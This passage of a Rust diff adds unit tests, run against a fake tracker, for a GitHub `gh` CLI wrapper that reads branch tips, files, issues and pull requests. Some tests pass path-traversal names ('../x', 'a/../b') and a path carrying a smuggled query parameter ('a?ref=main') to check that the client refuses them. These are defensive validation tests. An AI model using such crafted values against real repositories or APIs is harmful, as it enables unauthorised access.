@@ -403,6 +403,24 @@ pub fn file_at<G: Tracker + ?Sized>(
     todo!("part A")
 }
 
+/// Whether `branch` can be a path under `refs/heads/` in the API: no empty or dot segment.
+pub fn is_branch_path(branch: &str) -> bool {
+    let _ = branch;
+    todo!("part A")
+}
+
+/// Whether `name` can go into a ref the factory passes to git.
+pub fn is_plain_ref_name(name: &str) -> bool {
+    let _ = name;
+    todo!("part A")
+}
+
+/// Whether `branch` is only the characters of an ordinary branch name.
+pub fn is_safe_branch_name(branch: &str) -> bool {
+    let _ = branch;
+    todo!("part A")
+}
+
 // ---------------------------------------------------------------------------------------------
 // End of part A.
 // ---------------------------------------------------------------------------------------------
@@ -638,6 +656,1435 @@ mod tests {
     }
 
     // ----- Part A tests -----
+
+    const REPO: &str = "rawphp/softfac";
+    const BASE_SHA: &str = "9f8e7d6c5b4a39281706f5e4d3c2b1a098765432";
+    const FILE_SHA: &str = BASE_SHA;
+    const CONFIG_TEXT: &str = "factory:\n  instructors: [tomkaczocha]\n  base: main\n";
+    const CONFIG_B64: &str =
+        "ZmFjdG9yeToKICBpbnN0cnVjdG9yczogW3RvbWthY3pvY2hhXQogIGJhc2U6IG1haW4K\n";
+    const HEAD_SHA: &str = "4f1c2d3e4a5b60718293a4b5c6d7e8f901234567";
+
+    fn is_parse(error: &TrackerError) -> bool {
+        matches!(error, TrackerError::Other(m) if m.contains("returned unexpected output"))
+    }
+
+    fn is_refused(error: &TrackerError) -> bool {
+        matches!(error, TrackerError::Other(m)
+            if m.contains("before calling gh") && !m.contains("unexpected output"))
+    }
+
+    fn is_failed(error: &TrackerError) -> bool {
+        matches!(error, TrackerError::Other(m) if m.contains("exited with status"))
+    }
+
+    fn ref_reply(sha: &str) -> String {
+        format!(
+            "{{\"ref\":\"refs/heads/main\",\"node_id\":\"REF_x\",\"url\":\"https://api.github.com/repos/rawphp/softfac/git/refs/heads/main\",\"object\":{{\"sha\":\"{sha}\",\"type\":\"commit\",\"url\":\"https://api.github.com/repos/rawphp/softfac/git/commits/{sha}\"}}}}"
+        )
+    }
+
+    fn file_reply(kind: &str, encoding: &str, size: u64, content: &str) -> String {
+        serde_json::json!({
+            "name": "config.yml",
+            "path": ".dw/config.yml",
+            "sha": "abc",
+            "size": size,
+            "url": "https://api.github.com/repos/rawphp/softfac/contents/.dw/config.yml?ref=main",
+            "type": kind,
+            "content": content,
+            "encoding": encoding,
+            "_links": {"self": "x"},
+        })
+        .to_string()
+    }
+
+    fn encode_base64(bytes: &[u8]) -> String {
+        const TABLE: &[u8; 64] =
+            b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
+        let mut out = String::new();
+        for chunk in bytes.chunks(3) {
+            let n = chunk
+                .iter()
+                .enumerate()
+                .fold(0u32, |n, (i, b)| n | (u32::from(*b) << (16 - 8 * i)));
+            for i in 0..4 {
+                if i <= chunk.len() {
+                    out.push(TABLE[((n >> (18 - 6 * i)) & 63) as usize] as char);
+                } else {
+                    out.push('=');
+                }
+            }
+        }
+        out
+    }
+
+    #[test]
+    fn branch_tip_reads_the_full_commit_id_of_the_branch_with_the_exact_call() {
+        let fake = FakeTracker::answering([Answer::ok(ref_reply(BASE_SHA))]);
+        assert_eq!(branch_tip(&fake, REPO, "main").unwrap(), BASE_SHA);
+        assert_eq!(
+            fake.calls(),
+            vec![args(&["api", "repos/rawphp/softfac/git/ref/heads/main"])]
+        );
+    }
+
+    #[test]
+    fn branch_tip_keeps_slashes_in_the_branch_and_encodes_everything_else() {
+        let fake = FakeTracker::answering([
+            Answer::ok(ref_reply(BASE_SHA)),
+            Answer::ok(ref_reply(BASE_SHA)),
+        ]);
+        branch_tip(&fake, REPO, "release/1.0").unwrap();
+        branch_tip(&fake, REPO, "a b?c#d%e").unwrap();
+        let calls = fake.calls();
+        assert_eq!(
+            calls[0][1],
+            "repos/rawphp/softfac/git/ref/heads/release/1.0"
+        );
+        assert_eq!(
+            calls[1][1],
+            "repos/rawphp/softfac/git/ref/heads/a%20b%3Fc%23d%25e"
+        );
+    }
+
+    #[test]
+    fn branch_tip_refuses_an_answer_that_is_not_a_commit_id_or_not_a_commit() {
+        let tag = ref_reply(&BASE_SHA.to_uppercase()).replace("commit", "tag");
+        for answer in [
+            ref_reply("main"),
+            ref_reply("9f8e7d6c5b4a3928"),
+            tag,
+            "{\"object\":{\"type\":\"commit\"}}".to_string(),
+            "[]".to_string(),
+            "not json".to_string(),
+        ] {
+            let fake = FakeTracker::answering([Answer::ok(answer.clone())]);
+            let error = branch_tip(&fake, REPO, "main").unwrap_err();
+            assert!(is_parse(&error), "{answer}: {error}");
+        }
+    }
+
+    #[test]
+    fn branch_tip_accepts_a_64_digit_id() {
+        let sha = "a".repeat(64);
+        let fake = FakeTracker::answering([Answer::ok(ref_reply(&sha))]);
+        assert_eq!(branch_tip(&fake, REPO, "main").unwrap(), sha);
+    }
+
+    #[test]
+    fn branch_tip_refuses_a_branch_name_that_could_leave_the_refs_path_with_no_call() {
+        for branch in ["", "..", "../x", "a/../b", "./x", "/x", "x//y", "x/"] {
+            let fake = FakeTracker::answering([Answer::ok(ref_reply(BASE_SHA))]);
+            let error = branch_tip(&fake, REPO, branch).unwrap_err();
+            assert!(is_refused(&error), "{branch}: {error}");
+            assert!(fake.calls().is_empty(), "{branch}");
+        }
+    }
+
+    #[test]
+    fn branch_tip_of_a_branch_that_is_not_there_is_the_gh_failure() {
+        let fake = FakeTracker::answering([Answer::fail(1, "gh: Not Found (HTTP 404)")]);
+        let error = branch_tip(&fake, REPO, "gone").unwrap_err();
+        assert!(matches!(error, TrackerError::NotFound { .. }), "{error}");
+    }
+
+    #[test]
+    fn default_branch_reads_the_repo_from_the_api_with_the_exact_call() {
+        let fake = FakeTracker::answering([Answer::ok(
+            "{\"id\":1,\"name\":\"softfac\",\"full_name\":\"rawphp/softfac\",\"default_branch\":\"main\",\"private\":true}",
+        )]);
+        assert_eq!(default_branch(&fake, REPO).unwrap(), "main");
+        assert_eq!(fake.calls(), vec![args(&["api", "repos/rawphp/softfac"])]);
+    }
+
+    #[test]
+    fn default_branch_refuses_an_answer_without_one() {
+        for answer in [
+            "{\"name\":\"softfac\"}",
+            "{\"default_branch\":\"\"}",
+            "{\"default_branch\":null}",
+            "[]",
+            "no",
+        ] {
+            let fake = FakeTracker::answering([Answer::ok(answer)]);
+            let error = default_branch(&fake, REPO).unwrap_err();
+            assert!(is_parse(&error), "{answer}: {error}");
+        }
+    }
+
+    #[test]
+    fn file_at_reads_a_file_at_a_commit_with_the_exact_call_and_decodes_it() {
+        let fake =
+            FakeTracker::answering([Answer::ok(file_reply("file", "base64", 51, CONFIG_B64))]);
+        assert_eq!(
+            file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap(),
+            CONFIG_TEXT
+        );
+        assert_eq!(
+            fake.calls(),
+            vec![args(&[
+                "api",
+                &format!("repos/rawphp/softfac/contents/.dw/config.yml?ref={FILE_SHA}")
+            ])]
+        );
+    }
+
+    #[test]
+    fn file_at_decodes_content_wrapped_over_several_lines_and_padded() {
+        let b64 = "YWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFh\nYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYWFhYQo=\n";
+        let fake = FakeTracker::answering([Answer::ok(file_reply("file", "base64", 101, b64))]);
+        assert_eq!(
+            file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap(),
+            format!("{}\n", "a".repeat(100))
+        );
+    }
+
+    #[test]
+    fn file_at_refuses_a_file_over_the_size_cap_even_when_its_content_is_whole() {
+        // The size check must refuse it on its own: the content matches the stated size.
+        let size = MAX_FILE_BYTES + 1;
+        let content = encode_base64("a".repeat(size as usize).as_bytes());
+        let fake =
+            FakeTracker::answering([Answer::ok(file_reply("file", "base64", size, &content))]);
+        let error = file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap_err();
+        assert!(is_parse(&error), "{error}");
+        assert!(error.to_string().contains("it is too big"), "{error}");
+    }
+
+    #[test]
+    fn file_at_refuses_what_is_not_a_plain_complete_file() {
+        for answer in [
+            // A directory is a JSON array.
+            "[{\"type\":\"file\",\"name\":\"config.yml\"}]".to_string(),
+            file_reply("symlink", "base64", 51, CONFIG_B64),
+            file_reply("submodule", "base64", 51, CONFIG_B64),
+            // A file over 1 MB comes with no content and the encoding `none`.
+            file_reply("file", "none", 2_000_000, ""),
+            // Under the size cap, but the content is not base64 even though it reads like it.
+            file_reply("file", "none", 51, CONFIG_B64),
+            file_reply("file", "utf-8", 51, CONFIG_B64),
+            // The size says more than the content holds: truncated.
+            file_reply("file", "base64", 5_000, CONFIG_B64),
+            file_reply("file", "base64", 10, CONFIG_B64),
+            // Over the size this reader accepts, whatever the content says.
+            file_reply("file", "base64", MAX_FILE_BYTES + 1, CONFIG_B64),
+            // Not base64, not UTF-8.
+            file_reply("file", "base64", 51, "!!!not base64!!!"),
+            file_reply("file", "base64", 3, "//4K\n"),
+            "not json".to_string(),
+        ] {
+            let fake = FakeTracker::answering([Answer::ok(answer.clone())]);
+            let error = file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap_err();
+            assert!(is_parse(&error), "{answer}: {error}");
+        }
+    }
+
+    #[test]
+    fn file_at_refuses_base64_whose_padding_does_not_fit_its_length() {
+        // `YQ==` is "a" and `YWI=` is "ab". One `=` after two characters, or two after three,
+        // is not base64.
+        for (b64, size) in [("YQ=", 1), ("YWI==", 2), ("YQ", 1), ("YQ==YQ==", 2)] {
+            let fake =
+                FakeTracker::answering([Answer::ok(file_reply("file", "base64", size, b64))]);
+            let error = file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap_err();
+            assert!(is_parse(&error), "{b64}: {error}");
+        }
+        for (b64, want) in [("YQ==", "a"), ("YWI=", "ab")] {
+            let fake = FakeTracker::answering([Answer::ok(file_reply(
+                "file",
+                "base64",
+                want.len() as u64,
+                b64,
+            ))]);
+            assert_eq!(
+                file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap(),
+                want
+            );
+        }
+    }
+
+    #[test]
+    fn file_at_makes_no_call_for_a_ref_that_is_not_a_full_commit_id_or_a_path_that_could_leave() {
+        for (path, sha) in [
+            (".dw/config.yml", "main"),
+            (".dw/config.yml", "9f8e7d6c"),
+            (".dw/config.yml", "9f8e7d6c5b4a39281706f5e4d3c2b1a09876543g"),
+            ("../x", FILE_SHA),
+            ("a//b", FILE_SHA),
+            ("", FILE_SHA),
+            ("a b", FILE_SHA),
+            ("a?ref=main", FILE_SHA),
+        ] {
+            let fake =
+                FakeTracker::answering([Answer::ok(file_reply("file", "base64", 51, CONFIG_B64))]);
+            let error = file_at(&fake, REPO, path, sha).unwrap_err();
+            assert!(is_refused(&error), "{path} {sha}: {error}");
+            assert!(fake.calls().is_empty(), "{path} {sha}");
+        }
+    }
+
+    #[test]
+    fn file_at_of_a_file_that_is_not_there_is_the_gh_failure() {
+        let fake = FakeTracker::answering([Answer::fail(1, "gh: Not Found (HTTP 404)")]);
+        let error = file_at(&fake, REPO, ".dw/config.yml", FILE_SHA).unwrap_err();
+        assert!(matches!(error, TrackerError::NotFound { .. }), "{error}");
+    }
+
+    // The listings and one issue.
+
+    const LIST_ONE: &str = "[{\"assignees\":[{\"id\":\"MDQ6VXNlcjE=\",\"login\":\"rawphp\",\"name\":\"Tom\"}],\"labels\":[{\"id\":\"LA_1\",\"name\":\"factory:needs-info\",\"description\":\"d\",\"color\":\"d93f0b\"}],\"number\":6,\"title\":\"GitHub client\"}]";
+    const LIST_MANY: &str = "[{\"assignees\":[],\"labels\":[],\"number\":6,\"title\":\"GitHub client\"},{\"assignees\":[{\"login\":\"a\"},{\"login\":\"b\"}],\"labels\":[{\"name\":\"factory:ready\"},{\"name\":\"Postponed\"}],\"number\":9,\"title\":\"Daemon loop\"}]";
+    const ISSUE_VIEW: &str = "{\"assignees\":[{\"login\":\"rawphp\"}],\"author\":{\"id\":\"MDQ6VXNlcjE=\",\"is_bot\":false,\"login\":\"tomkaczocha\",\"name\":\"Tom\"},\"body\":\"Build the runner.\\n\\n- one\\n- two\",\"labels\":[{\"name\":\"factory:ready\"},{\"name\":\"phase:1\"}],\"number\":10,\"state\":\"OPEN\",\"title\":\"Build step\"}";
+
+    fn listing_of(count: u64) -> String {
+        let rows: Vec<String> = (1..=count)
+            .rev()
+            .map(|n| {
+                format!("{{\"assignees\":[],\"labels\":[],\"number\":{n},\"title\":\"issue {n}\"}}")
+            })
+            .collect();
+        format!("[{}]", rows.join(","))
+    }
+
+    fn issue_json(labels: &[&str], assignees: &[&str], body: &str) -> String {
+        let assignees: Vec<String> = assignees
+            .iter()
+            .map(|n| format!("{{\"login\":\"{n}\"}}"))
+            .collect();
+        let labels: Vec<String> = labels
+            .iter()
+            .map(|n| format!("{{\"name\":\"{n}\"}}"))
+            .collect();
+        format!(
+            "{{\"assignees\":[{}],\"author\":null,\"body\":{body},\"labels\":[{}],\"number\":10,\"state\":\"OPEN\",\"title\":\"Build step\"}}",
+            assignees.join(","),
+            labels.join(",")
+        )
+    }
+
+    fn issue_view_call(number: &str) -> Vec<String> {
+        args(&[
+            "issue",
+            "view",
+            number,
+            "--repo",
+            REPO,
+            "--json",
+            "number,title,body,labels,assignees,state,author",
+        ])
+    }
+
+    #[test]
+    fn list_issues_with_none() {
+        let fake = FakeTracker::answering([Answer::ok("[]")]);
+        let issues = list_issues(&fake, REPO, State::Ready).unwrap();
+        assert_eq!(
+            issues,
+            Listing {
+                items: vec![],
+                cut: false
+            }
+        );
+        assert_eq!(
+            fake.calls(),
+            vec![args(&[
+                "issue",
+                "list",
+                "--repo",
+                REPO,
+                "--state",
+                "open",
+                "--label",
+                "factory:ready",
+                "--limit",
+                "201",
+                "--json",
+                "number,title,assignees,labels",
+            ])]
+        );
+    }
+
+    #[test]
+    fn list_issues_with_one_ignores_unknown_fields() {
+        let fake = FakeTracker::answering([Answer::ok(LIST_ONE)]);
+        let issues = list_issues(&fake, REPO, State::NeedsInfo).unwrap();
+        assert_eq!(
+            issues.items,
+            vec![IssueSummary {
+                number: 6,
+                title: "GitHub client".into(),
+                assignees: vec!["rawphp".into()],
+                labels: vec!["factory:needs-info".into()],
+            }]
+        );
+        assert_eq!(fake.calls()[0][7], "factory:needs-info");
+    }
+
+    #[test]
+    fn list_issues_with_several_carries_each_ones_label_names_or_none() {
+        let fake = FakeTracker::answering([Answer::ok(LIST_MANY)]);
+        let issues = list_issues(&fake, REPO, State::Ready).unwrap();
+        assert_eq!(
+            issues.items,
+            vec![
+                IssueSummary {
+                    number: 6,
+                    title: "GitHub client".into(),
+                    assignees: vec![],
+                    labels: vec![],
+                },
+                IssueSummary {
+                    number: 9,
+                    title: "Daemon loop".into(),
+                    assignees: vec!["a".into(), "b".into()],
+                    labels: vec!["factory:ready".into(), "Postponed".into()],
+                },
+            ]
+        );
+    }
+
+    #[test]
+    fn list_issues_past_the_limit_returns_the_first_200_and_says_it_was_cut() {
+        assert_eq!(LIST_LIMIT, 200);
+        let fake = FakeTracker::answering([Answer::ok(listing_of(201))]);
+        let issues = list_issues(&fake, REPO, State::Ready).unwrap();
+        assert!(issues.cut);
+        assert_eq!(issues.items.len(), 200);
+        assert_eq!(
+            issues.items.iter().map(|i| i.number).collect::<Vec<_>>(),
+            (2..=201).rev().collect::<Vec<u64>>()
+        );
+        assert_eq!(fake.calls()[0][9], "201");
+    }
+
+    #[test]
+    fn list_issues_at_the_limit_returns_them_all_and_says_nothing() {
+        let fake = FakeTracker::answering([Answer::ok(listing_of(200))]);
+        let issues = list_issues(&fake, REPO, State::Ready).unwrap();
+        assert!(!issues.cut);
+        assert_eq!(issues.items.len(), 200);
+    }
+
+    #[test]
+    fn malformed_json_is_a_parse_error_carrying_the_args() {
+        let fake = FakeTracker::answering([Answer::ok("not json")]);
+        let error = list_issues(&fake, REPO, State::Ready).unwrap_err();
+        let message = error.to_string();
+        assert!(is_parse(&error), "{message}");
+        assert!(message.contains("JSON array of issues"), "{message}");
+        assert!(message.contains("unexpected output"), "{message}");
+        assert!(
+            message.contains("gh issue list --repo rawphp/softfac"),
+            "{message}"
+        );
+    }
+
+    #[test]
+    fn issue_reads_the_real_shape_with_the_exact_call() {
+        let fake = FakeTracker::answering([Answer::ok(ISSUE_VIEW)]);
+        let detail = issue(&fake, REPO, 10).unwrap();
+        assert_eq!(fake.calls(), vec![issue_view_call("10")]);
+        assert_eq!(
+            detail,
+            IssueDetail {
+                number: 10,
+                title: "Build step".into(),
+                body: "Build the runner.\n\n- one\n- two".into(),
+                labels: vec!["factory:ready".into(), "phase:1".into()],
+                assignees: vec!["rawphp".into()],
+                author: Some("tomkaczocha".into()),
+                state: Some(State::Ready),
+                closed: false,
+            }
+        );
+    }
+
+    #[test]
+    fn issue_says_when_github_has_it_closed_and_keeps_its_factory_label() {
+        let fake = FakeTracker::answering([Answer::ok(
+            ISSUE_VIEW.replace("\"state\":\"OPEN\"", "\"state\":\"CLOSED\""),
+        )]);
+        let detail = issue(&fake, REPO, 10).unwrap();
+        assert!(detail.closed);
+        assert_eq!(detail.state, Some(State::Ready));
+    }
+
+    #[test]
+    fn issue_author_is_null_when_gh_gives_null_or_nothing() {
+        let without_author = {
+            let start = ISSUE_VIEW.find("\"author\":{").unwrap();
+            let end = start + ISSUE_VIEW[start..].find("},").unwrap() + 2;
+            format!("{}{}", &ISSUE_VIEW[..start], &ISSUE_VIEW[end..])
+        };
+        let fake = FakeTracker::answering([
+            Answer::ok(issue_json(&[], &[], "\"b\"")),
+            Answer::ok(without_author),
+        ]);
+        assert_eq!(issue(&fake, REPO, 10).unwrap().author, None);
+        assert_eq!(issue(&fake, REPO, 10).unwrap().author, None);
+    }
+
+    #[test]
+    fn issue_state_is_null_with_no_factory_label() {
+        let fake =
+            FakeTracker::answering([Answer::ok(issue_json(&["phase:1", "bug"], &[], "\"b\""))]);
+        let detail = issue(&fake, REPO, 10).unwrap();
+        assert_eq!(detail.state, None);
+        assert!(detail.assignees.is_empty());
+    }
+
+    #[test]
+    fn issue_state_is_the_one_factory_label() {
+        let fake = FakeTracker::answering([Answer::ok(issue_json(
+            &["bug", "factory:needs-info"],
+            &[],
+            "\"b\"",
+        ))]);
+        assert_eq!(
+            issue(&fake, REPO, 10).unwrap().state,
+            Some(State::NeedsInfo)
+        );
+    }
+
+    #[test]
+    fn issue_state_is_null_with_two_factory_labels() {
+        let fake = FakeTracker::answering([Answer::ok(issue_json(
+            &["factory:ready", "factory:building"],
+            &[],
+            "\"b\"",
+        ))]);
+        assert_eq!(issue(&fake, REPO, 10).unwrap().state, None);
+    }
+
+    #[test]
+    fn issue_state_is_null_for_an_unknown_factory_label() {
+        let fake =
+            FakeTracker::answering([Answer::ok(issue_json(&["factory:bogus"], &[], "\"b\""))]);
+        assert_eq!(issue(&fake, REPO, 10).unwrap().state, None);
+    }
+
+    #[test]
+    fn issue_state_is_null_with_a_bogus_and_a_real_factory_label_in_either_order() {
+        for labels in [
+            ["factory:bogus", "factory:ready"],
+            ["factory:ready", "factory:bogus"],
+        ] {
+            let fake = FakeTracker::answering([Answer::ok(issue_json(&labels, &[], "\"b\""))]);
+            assert_eq!(issue(&fake, REPO, 10).unwrap().state, None, "{labels:?}");
+        }
+    }
+
+    #[test]
+    fn issue_with_a_null_body_has_an_empty_body_and_keeps_every_assignee() {
+        let fake = FakeTracker::answering([Answer::ok(issue_json(
+            &["factory:ready"],
+            &["a", "b"],
+            "null",
+        ))]);
+        let detail = issue(&fake, REPO, 10).unwrap();
+        assert_eq!(detail.body, "");
+        assert_eq!(detail.assignees, vec!["a".to_string(), "b".to_string()]);
+    }
+
+    #[test]
+    fn issue_errors_are_typed() {
+        let failing = FakeTracker::answering([Answer::fail(1, "not found")]);
+        let failed = issue(&failing, REPO, 10).unwrap_err();
+        assert!(is_failed(&failed), "{failed}");
+        assert!(failed.to_string().contains("status 1"), "{failed}");
+
+        let wrong = FakeTracker::answering([Answer::ok("[]")]);
+        assert!(is_parse(&issue(&wrong, REPO, 10).unwrap_err()));
+
+        let null_assignees = FakeTracker::answering([Answer::ok("{\"assignees\":null}")]);
+        assert!(is_parse(&issue(&null_assignees, REPO, 10).unwrap_err()));
+    }
+
+    #[test]
+    fn issue_uses_the_number_it_is_given() {
+        let fake =
+            FakeTracker::answering([Answer::ok(issue_json(&["factory:ready"], &[], "\"b\""))]);
+        issue(&fake, REPO, 7).unwrap();
+        assert_eq!(fake.calls()[0][..3], args(&["issue", "view", "7"])[..]);
+    }
+
+    // Pull requests.
+
+    const PR_VIEW: &str = "{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"main\",\"headRefName\":\"t3code/2bb65018\",\"headRefOid\":\"4f1c2d3e4a5b60718293a4b5c6d7e8f901234567\",\"isCrossRepository\":false,\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":2,\"state\":\"OPEN\"}";
+
+    fn pr_view(state: &str, draft: bool) -> String {
+        format!(
+            "{{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"main\",\"headRefName\":\"x\",\"headRefOid\":\"{HEAD_SHA}\",\"isCrossRepository\":false,\"isDraft\":{draft},\"mergeable\":\"MERGEABLE\",\"number\":9,\"state\":\"{state}\"}}"
+        )
+    }
+
+    fn pr_view_call(number: &str) -> Vec<String> {
+        args(&[
+            "pr",
+            "view",
+            number,
+            "--repo",
+            REPO,
+            "--json",
+            "number,isDraft,state,headRefName,isCrossRepository,baseRefName,headRefOid,mergeable,createdAt",
+        ])
+    }
+
+    #[test]
+    fn pull_request_reads_the_real_shape_with_the_exact_call() {
+        let fake = FakeTracker::answering([Answer::ok(PR_VIEW)]);
+        let pr = pull_request(&fake, REPO, 2).unwrap();
+        assert_eq!(fake.calls(), vec![pr_view_call("2")]);
+        assert_eq!(
+            pr,
+            Some(PullRequest {
+                number: 2,
+                is_draft: true,
+                open: true,
+                merged: false,
+                head_ref: "t3code/2bb65018".into(),
+                cross_repository: false,
+                base_ref: "main".into(),
+                head_sha: HEAD_SHA.into(),
+                mergeable: Mergeable::Mergeable,
+                created_at: "2026-10-29T05:50:00Z".into(),
+            })
+        );
+    }
+
+    #[test]
+    fn pull_request_reads_githubs_mergeable_state_and_anything_else_as_unknown() {
+        for (raw, mergeable) in [
+            ("MERGEABLE", Mergeable::Mergeable),
+            ("CONFLICTING", Mergeable::Conflicting),
+            ("UNKNOWN", Mergeable::Unknown),
+            ("SOMETHING_NEW", Mergeable::Unknown),
+        ] {
+            let fake = FakeTracker::answering([Answer::ok(
+                PR_VIEW.replace("\"MERGEABLE\"", &format!("\"{raw}\"")),
+            )]);
+            let pr = pull_request(&fake, REPO, 2).unwrap().unwrap();
+            assert_eq!(fake.calls(), vec![pr_view_call("2")], "{raw}");
+            assert_eq!(pr.mergeable, mergeable, "{raw}");
+        }
+    }
+
+    #[test]
+    fn pull_request_says_when_it_is_merged_and_is_then_not_open() {
+        let merged = FakeTracker::answering([Answer::ok(
+            PR_VIEW.replace("\"state\":\"OPEN\"", "\"state\":\"MERGED\""),
+        )]);
+        let pr = pull_request(&merged, REPO, 2).unwrap().unwrap();
+        assert!(pr.merged);
+        assert!(!pr.open);
+        let closed = FakeTracker::answering([Answer::ok(
+            PR_VIEW.replace("\"state\":\"OPEN\"", "\"state\":\"CLOSED\""),
+        )]);
+        let other = pull_request(&closed, REPO, 2).unwrap().unwrap();
+        assert!(!other.merged);
+        assert!(!other.open);
+    }
+
+    #[test]
+    fn pull_request_from_a_fork_and_into_another_base_says_so() {
+        let fake = FakeTracker::answering([Answer::ok(format!(
+            "{{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"release/1.0\",\"headRefName\":\"t3code/x\",\"headRefOid\":\"{HEAD_SHA}\",\"isCrossRepository\":true,\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":4,\"state\":\"OPEN\"}}"
+        ))]);
+        let pr = pull_request(&fake, REPO, 4).unwrap().unwrap();
+        assert!(pr.cross_repository);
+        assert_eq!(pr.base_ref, "release/1.0");
+        assert_eq!(pr.head_ref, "t3code/x");
+    }
+
+    #[test]
+    fn a_pull_request_view_without_the_fork_or_base_fields_is_a_parse_error() {
+        let fake = FakeTracker::answering([Answer::ok(format!(
+            "{{\"createdAt\":\"2026-10-29T05:50:00Z\",\"headRefName\":\"x\",\"headRefOid\":\"{HEAD_SHA}\",\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":3,\"state\":\"OPEN\"}}"
+        ))]);
+        assert!(is_parse(&pull_request(&fake, REPO, 3).unwrap_err()));
+    }
+
+    #[test]
+    fn a_pull_request_view_without_the_head_commit_is_a_parse_error() {
+        let fake = FakeTracker::answering([Answer::ok(
+            "{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"main\",\"headRefName\":\"x\",\"isCrossRepository\":false,\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":3,\"state\":\"OPEN\"}",
+        )]);
+        assert!(is_parse(&pull_request(&fake, REPO, 3).unwrap_err()));
+    }
+
+    #[test]
+    fn pull_request_reads_the_head_commit_as_given() {
+        let sha = "0123456789abcdef0123456789abcdef01234567";
+        let fake = FakeTracker::answering([Answer::ok(format!(
+            "{{\"createdAt\":\"2026-10-29T05:50:00Z\",\"baseRefName\":\"main\",\"headRefName\":\"x\",\"headRefOid\":\"{sha}\",\"isCrossRepository\":false,\"isDraft\":true,\"mergeable\":\"MERGEABLE\",\"number\":3,\"state\":\"OPEN\"}}"
+        ))]);
+        assert_eq!(pull_request(&fake, REPO, 3).unwrap().unwrap().head_sha, sha);
+    }
+
+    #[test]
+    fn a_pull_request_whose_creation_time_is_not_a_utc_second_is_a_parse_error() {
+        for at in [
+            "",
+            "2026-10-29T05:50:00+10:00",
+            "2026-10-29T05:50:00.5Z",
+            "yesterday",
+        ] {
+            let fake =
+                FakeTracker::answering([Answer::ok(PR_VIEW.replace("2026-10-29T05:50:00Z", at))]);
+            let error = pull_request(&fake, REPO, 2).unwrap_err();
+            assert!(is_parse(&error), "{at}: {error}");
+        }
+    }
+
+    #[test]
+    fn a_pull_request_whose_head_commit_is_not_a_full_id_is_a_parse_error() {
+        for sha in [
+            String::new(),
+            "4f1c2d3".to_string(),
+            format!("{HEAD_SHA}0"),
+            HEAD_SHA.replace('4', "g"),
+        ] {
+            let fake = FakeTracker::answering([Answer::ok(PR_VIEW.replace(HEAD_SHA, &sha))]);
+            let error = pull_request(&fake, REPO, 2).unwrap_err();
+            assert!(is_parse(&error), "{sha}: {error}");
+        }
+    }
+
+    #[test]
+    fn pull_request_merged_and_closed_are_not_open() {
+        for state in ["MERGED", "CLOSED"] {
+            let fake = FakeTracker::answering([Answer::ok(pr_view(state, false))]);
+            let pr = pull_request(&fake, REPO, 9).unwrap().unwrap();
+            assert!(!pr.open, "{state}");
+            assert!(!pr.is_draft, "{state}");
+        }
+    }
+
+    #[test]
+    fn a_pull_request_that_does_not_exist_is_null() {
+        for stderr in [
+            "GraphQL: Could not resolve to a PullRequest with the number of 999. (repository.pullRequest)\n",
+            "graphql: could not resolve to a pullrequest with the number of 999.",
+            "GRAPHQL: COULD NOT RESOLVE TO A PULLREQUEST",
+        ] {
+            let fake = FakeTracker::answering([Answer::fail(1, stderr)]);
+            assert_eq!(pull_request(&fake, REPO, 999).unwrap(), None, "{stderr}");
+        }
+    }
+
+    #[test]
+    fn any_other_pull_request_failure_stays_an_error() {
+        for stderr in [
+            "HTTP 502: Bad Gateway",
+            "Could not resolve host: api.github.com",
+            "Could not resolve to an Issue with the number of 5.",
+            "",
+        ] {
+            let fake = FakeTracker::answering([Answer::fail(1, stderr)]);
+            let error = pull_request(&fake, REPO, 999).unwrap_err();
+            assert!(is_failed(&error), "{stderr}: {error}");
+            assert!(error.to_string().contains("status 1"), "{stderr}: {error}");
+        }
+        let fake = FakeTracker::new();
+        let error = pull_request(&fake, REPO, 999).unwrap_err();
+        assert!(
+            matches!(&error, TrackerError::Other(m) if m.contains("cannot start")),
+            "{error}"
+        );
+    }
+
+    #[test]
+    fn pull_request_errors_are_typed() {
+        let failed = FakeTracker::answering([Answer::fail(1, "no pull requests found")]);
+        assert!(is_failed(&pull_request(&failed, REPO, 2).unwrap_err()));
+        let parse = FakeTracker::answering([Answer::ok("{}")]);
+        assert!(is_parse(&pull_request(&parse, REPO, 2).unwrap_err()));
+    }
+
+    #[test]
+    fn issue_and_pull_request_calls_use_the_number_they_are_given() {
+        let fake = FakeTracker::answering([
+            Answer::ok(issue_json(&["factory:ready"], &[], "\"b\"")),
+            Answer::ok(pr_view("OPEN", true)),
+        ]);
+        issue(&fake, REPO, 7).unwrap();
+        pull_request(&fake, REPO, 3).unwrap();
+        assert_eq!(fake.calls(), vec![issue_view_call("7"), pr_view_call("3")]);
+    }
+
+    // Checks.
+
+    fn run(name: &str, status: &str, conclusion: Option<&str>) -> serde_json::Value {
+        serde_json::json!({
+            "id": 1,
+            "name": name,
+            "status": status,
+            "conclusion": conclusion,
+            "html_url": format!("https://github.com/rawphp/softfac/actions/runs/1/job/{name}"),
+            "app": {"slug": "github-actions"},
+        })
+    }
+
+    fn with_url(mut run: serde_json::Value, url: serde_json::Value) -> serde_json::Value {
+        run["html_url"] = url;
+        run
+    }
+
+    fn page(runs: &[serde_json::Value]) -> String {
+        serde_json::Value::Array(runs.to_vec()).to_string()
+    }
+
+    fn checks_call() -> Vec<String> {
+        args(&[
+            "api",
+            &format!(
